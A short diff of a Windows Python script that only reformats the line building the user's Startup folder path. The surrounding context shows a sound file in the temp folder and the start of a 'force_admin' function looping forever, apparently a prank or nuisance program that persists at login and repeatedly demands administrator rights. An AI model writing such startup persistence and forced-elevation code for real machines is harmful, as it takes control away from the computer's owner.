@@ -3,8 +3,8 @@ from os import startfile, getlogin, getenv
 from ctypes import windll
 
 path = getenv('temp') + "\\seal.mp3"
-startup_path = str(getenv("SystemDrive") + "\\Users\\" + getlogin() + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\")
-
+startup_path = str(getenv(
+    "SystemDrive") + "\\Users\\" + getlogin() + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\")
 try:
     def force_admin():
         while True:
